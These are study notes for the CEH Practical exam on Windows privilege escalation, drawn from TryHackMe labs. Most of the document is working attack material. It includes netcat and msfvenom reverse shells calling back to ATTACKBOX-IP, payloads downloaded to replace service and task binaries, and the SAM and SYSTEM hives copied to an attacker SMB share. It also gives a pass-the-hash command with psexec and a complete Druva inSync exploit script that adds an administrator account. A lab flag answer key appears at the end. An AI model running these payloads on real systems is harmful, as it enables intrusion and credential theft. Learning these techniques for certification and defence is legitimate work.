# Windows Privilege Escalation — CEH Practical Revision Notes

> Based on TryHackMe Windows Privilege Escalation walkthroughs and common real-world privilege escalation techniques.

---

# Table of Contents

1. Windows Privilege Escalation Basics
    
2. Password Harvesting
    
3. Scheduled Task Exploitation
    
4. Service Misconfigurations
    
5. Unquoted Service Paths
    
6. Weak Service Permissions
    
7. Dangerous Windows Privileges
    
8. SAM & SYSTEM Hash Extraction
    
9. Pass-the-Hash
    
10. Vulnerable Software Exploitation
    
11. Essential Commands Cheat Sheet
    
12. CEH Practical Quick Methodology
    
13. Important Payloads & One-Liners
    
14. Flags & Answers Summary
    

---

# 1. Windows Privilege Escalation Basics

## Important Accounts

|Account|Privilege Level|
|---|---|
|User|Low Privileges|
|Administrator|High Privileges|
|SYSTEM / LocalSystem|Highest Privilege|

## Important Groups

|Group|Purpose|
|---|---|
|Administrators|Full system control|
|Backup Operators|Can backup sensitive files|
|Remote Desktop Users|RDP access|
|Users|Standard users|

## Key Enumeration Commands

```cmd
whoami
whoami /priv
whoami /groups
hostname
systeminfo
ipconfig /all
net user
net localgroup administrators
```

## Check Running Services

```cmd
sc query
wmic service list brief
```

## Find Scheduled Tasks

```cmd
schtasks
```

---

# 2. Password Harvesting

## 2.1 PowerShell History Credentials

### Why it works

Users sometimes type passwords directly into PowerShell.  
PowerShell stores command history locally.

### Location

```cmd
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Retrieve History

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Example Password Found

```text
ZuperCkretPa5z
```

---

## 2.2 IIS web.config Credentials

### Why it works

IIS web applications often store:

- Database credentials
    
- API keys
    
- Connection strings
    

### Common Locations

```cmd
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

### Search Connection Strings

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Example Password

```text
098n0x35skjD3
```

---

## 2.3 Saved Windows Credentials

### List Stored Credentials

```cmd
cmdkey /list
```

### Spawn Shell Using Saved Credentials

```cmd
runas /savecred /user:mike.katz cmd.exe
```

### Verify User

```cmd
whoami
```

### Read Flag

```cmd
type C:\Users\mike.katz\Desktop\flag.txt
```

### Example Flag

```text
THM{WHAT_IS_MY_PASSWORD}
```

---

## 2.4 PuTTY Saved Credentials

### Why it works

PuTTY stores session details in the registry.  
Sometimes proxy credentials are stored in plaintext.

### Retrieve PuTTY Credentials

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### Example Password

```text
CoolPass2021
```

---

# 3. Scheduled Task Exploitation

## Why it works

A scheduled task runs as a privileged user.  
If its executable/script is writable, replace it with a reverse shell.

---

## Enumerate Tasks

```cmd
schtasks
```

## View Task Details

```cmd
schtasks /query /tn vulntask /fo list /v
```

### Important Fields

```text
Task To Run
Run As User
```

---

## Check File Permissions

```cmd
icacls C:\tasks\schtask.bat
```

### Dangerous Output

```text
BUILTIN\Users:(F)
```

Meaning:

- Users have Full Access
    
- File is writable
    

---

## Reverse Shell Payload

### Start Listener

```bash
nc -lvnp 9292
```

### Replace Scheduled Task

```cmd
echo c:\tools\nc64.exe -e cmd.exe ATTACKBOX-IP 9292 > C:\tasks\schtask.bat
```

### Trigger Task

```cmd
schtasks /run /tn vulntask
```

### Read Flag

```cmd
type C:\Users\taskusr1\Desktop\flag.txt
```

### Example Flag

```text
THM{TASK_COMPLETED}
```

---

# 4. Service Misconfigurations

## Key Concept

Windows services often run as privileged users.  
If:

- executable is writable
    
- service config is writable
    
- service path is vulnerable
    

→ privilege escalation possible.

---

# 5. Weak Service Executable Permissions

## Enumerate Service

```cmd
sc qc WindowsScheduler
```

### Important Fields

```text
BINARY_PATH_NAME
SERVICE_START_NAME
```

---

## Check Permissions

```cmd
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

### Dangerous Output

```text
Everyone:(M)
```

Meaning:

- Everyone can Modify executable
    

---

## Create Malicious Service Binary

### Generate Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=9292 -f exe-service -o rev-svc.exe
```

### Host Payload

```bash
python3 -m http.server
```

---

## Download Payload on Victim

```powershell
wget http://ATTACKBOX-IP:8000/rev-svc.exe -O rev-svc.exe
```

---

## Replace Service Executable

```cmd
cd C:\PROGRA~2\SYSTEM~1\
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
```

---

## Start Listener

```bash
nc -lvnp 9292
```

---

## Restart Service

```cmd
sc stop windowsscheduler
sc start windowsscheduler
```

---

## Read Flag

```cmd
type C:\Users\svcusr1\Desktop\flag.txt
```

### Example Flag

```text
THM{AT_YOUR_SERVICE}
```

---

# 6. Unquoted Service Paths

## Why it works

Windows interprets spaces incorrectly in unquoted paths.

Example:

```text
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

Windows tries:

```text
C:\MyPrograms\Disk.exe
```

first.

---

## Create Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX-IP LPORT=9292 -f exe-service -o rev-svc2.exe
```

---

## Download Payload

```powershell
wget http://ATTACKBOX-IP:8000/rev-svc2.exe -O rev-svc2.exe
```

---

## Place Malicious Binary

```cmd
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
```

---

## Give Permissions

```cmd
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

---

## Restart Vulnerable Service

```cmd
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

---

## Read Flag

```cmd
type C:\Users\svcusr2\Desktop\flag.txt
```

### Example Flag

```text
THM{QUOTES_EVERYWHERE}
```

---

# 7. Weak Service Permissions (SERVICE_ALL_ACCESS)

## Why it works

Users can reconfigure a service to run malicious executables.

---

## Check Service DACL

### AccessChk Tool

```cmd
accesschk64.exe -qlc THMService
```

### Dangerous Output

```text
SERVICE_ALL_ACCESS
```

Meaning:

- Any user can modify service configuration.
    

---

## Create Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX-IP LPORT=9292 -f exe-service -o rev-svc3.exe
```

---

## Download Payload

```powershell
wget http://ATTACKBOX-IP:8000/rev-svc3.exe -O rev-svc3.exe
```

---

## Give Permissions

```cmd
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

---

## Reconfigure Service

```cmd
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

### Important

```text
LocalSystem = Highest Windows Privileges
```

---

## Restart Service

```cmd
sc stop THMService
sc start THMService
```

---

## Read Administrator Flag

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

### Example Flag

```text
THM{INSECURE_SVC_CONFIG}
```

---

# 8. Dangerous Windows Privileges

## Important Privileges

|Privilege|Abuse|
|---|---|
|SeBackupPrivilege|Dump SAM/SYSTEM|
|SeRestorePrivilege|Restore files|
|SeImpersonatePrivilege|Potato attacks|
|SeDebugPrivilege|Access SYSTEM processes|

---

## Check Privileges

```cmd
whoami /priv
```

---

# 9. SAM & SYSTEM Hash Extraction

## Why it works

Windows stores password hashes inside:

- SAM
    
- SYSTEM
    

If we can copy these hives → extract hashes.

---

## Save Registry Hives

```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

---

## Start SMB Share on Kali

```bash
mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

---

## Copy Files to Kali

```cmd
copy C:\Users\THMBackup\sam.hive \\ATTACKBOX_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKBOX_IP\public\
```

---

## Extract Hashes

```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

---

# 10. Pass-the-Hash (PTH)

## Why it works

NTLM hashes can authenticate without knowing plaintext passwords.

---

## Psexec Pass-the-Hash

```bash
python3.9 /opt/impacket/examples/psexec.py -hashes ADMIN_HASH administrator@WINDOWS-IP
```

---

## Read Flag

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

### Example Flag

```text
THM{SEFLAGPRIVILEGE}
```

---

# 11. Vulnerable Software Exploitation

## Example: Druva inSync

### Goal

Exploit vulnerable software to add administrator user.

---

## PowerShell Exploit

```powershell
$ErrorActionPreference = "Stop";
$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add";

$s = New-Object System.Net.Sockets.Socket(
[System.Net.Sockets.AddressFamily]::InterNetwork,
[System.Net.Sockets.SocketType]::Stream,
[System.Net.Sockets.ProtocolType]::Tcp);

$s.Connect("127.0.0.1", 6064);

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]");
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0");
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header);
$s.Send($rpcType);
$s.Send($length);
$s.Send($command)
```

---

## Verify User

```cmd
net user pwnd
```

---

## Read Administrator Flag

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

### Example Flag

```text
THM{EZ_DLL_PROXY_4ME}
```

---

# 12. Essential Reverse Shell Payloads

## Netcat Listener

```bash
nc -lvnp 4444
```

---

## Netcat Reverse Shell

```cmd
nc64.exe -e cmd.exe ATTACKBOX-IP 4444
```

---

## msfvenom EXE Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX-IP LPORT=4444 -f exe -o shell.exe
```

---

## msfvenom Service Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX-IP LPORT=4444 -f exe-service -o svc.exe
```

---

# 13. CEH Practical Windows PrivEsc Methodology

## Step 1 — Initial Enumeration

```cmd
whoami
whoami /priv
hostname
systeminfo
net user
net localgroup administrators
```

---

## Step 2 — Check Password Storage

- PowerShell history
    
- web.config
    
- PuTTY sessions
    
- cmdkey
    
- browser creds
    

---

## Step 3 — Enumerate Services

```cmd
sc query
wmic service get name,displayname,pathname,startmode
```

Check for:

- weak permissions
    
- writable executables
    
- unquoted paths
    

---

## Step 4 — Enumerate Scheduled Tasks

```cmd
schtasks
```

---

## Step 5 — Check Privileges

```cmd
whoami /priv
```

Look for:

- SeImpersonatePrivilege
    
- SeBackupPrivilege
    
- SeRestorePrivilege
    

---

## Step 6 — Search for Vulnerable Software

```cmd
wmic product get name,version
```

Use:

- Searchsploit
    
- CVE databases
    
- Google
    

---

# 14. Important Tools for Windows PrivEsc

|Tool|Purpose|
|---|---|
|winPEAS|Automated enumeration|
|Seatbelt|Windows enumeration|
|AccessChk|Check service permissions|
|PowerUp|PowerShell PrivEsc|
|nc64.exe|Reverse shells|
|Mimikatz|Credential dumping|
|Impacket|PTH / SMB / Remote exec|
|msfvenom|Payload generation|

---

# 15. High-Value CEH Practical Commands Cheat Sheet

## Credential Hunting

```cmd
cmdkey /list
```

```cmd
reg query HKCU\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

---

## Services

```cmd
sc qc SERVICE_NAME
```

```cmd
accesschk64.exe -qlc SERVICE_NAME
```

```cmd
icacls FILE
```

---

## Scheduled Tasks

```cmd
schtasks
```

```cmd
schtasks /query /tn TASKNAME /fo list /v
```

---

## Hash Dumping

```cmd
reg save hklm\sam sam.hive
```

```cmd
reg save hklm\system system.hive
```

---

## Impacket

```bash
psexec.py
secretsdump.py
smbserver.py
wmiexec.py
```

---

# 16. Flags & Answers Summary

|Task|Flag|
|---|---|
|Saved Credentials|THM{WHAT_IS_MY_PASSWORD}|
|Scheduled Tasks|THM{TASK_COMPLETED}|
|Weak Service Permissions|THM{AT_YOUR_SERVICE}|
|Unquoted Service Paths|THM{QUOTES_EVERYWHERE}|
|Weak Service DACL|THM{INSECURE_SVC_CONFIG}|
|Dangerous Privileges|THM{SEFLAGPRIVILEGE}|
|Vulnerable Software|THM{EZ_DLL_PROXY_4ME}|

---

# 17. Final CEH Practical Tips

## Always Check

- Stored passwords
    
- Service permissions
    
- Scheduled tasks
    
- Writable folders
    
- Unquoted paths
    
- Dangerous privileges
    
- Installed software versions
    

---

## Common Exam Mistakes

❌ Forgetting listeners  
❌ Wrong IP in payload  
❌ Antivirus blocking payload  
❌ Not checking file permissions  
❌ Using Linux commands on Windows

---

## Fastest Windows PrivEsc Path

1. winPEAS
    
2. cmdkey
    
3. PowerShell history
    
4. Services
    
5. Scheduled tasks
    
6. Unquoted paths
    
7. SeBackup / SeImpersonate
    
8. Searchsploit vulnerable apps
    

---
